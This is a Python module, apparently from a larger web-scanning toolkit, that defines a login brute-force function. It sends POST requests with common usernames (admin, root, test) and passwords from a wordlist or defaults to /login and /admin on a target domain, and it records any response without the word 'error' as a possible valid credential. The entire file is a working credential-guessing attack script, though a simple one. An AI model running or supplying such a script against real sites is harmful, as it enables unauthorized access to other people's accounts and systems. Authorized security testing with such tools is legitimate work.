import requests
from core.logger import log
from core.report import write_report

def bruteforce(domain, wordlist, report):
    users = ["admin", "root", "test"]
    paths = ["/login", "/admin"]

    try:
        with open(wordlist, "r", errors="ignore") as f:
            passwords = [x.strip() for x in f.readlines()[:50]]
    except:
        passwords = ["123456", "admin", "password"]

    for path in paths:
        url = f"http://{domain}{path}"

        for u in users:
            for p in passwords[:5]:
                try:
                    r = requests.post(
                        url,
                        data={"username": u, "password": p},
                        timeout=5
                    )

                    if "error" not in r.text.lower():
                        log(f"POSSIBLE {u}:{p}", "WARN")
                        write_report(report, f"{u}:{p} -> {url}")

                except:
                    pass
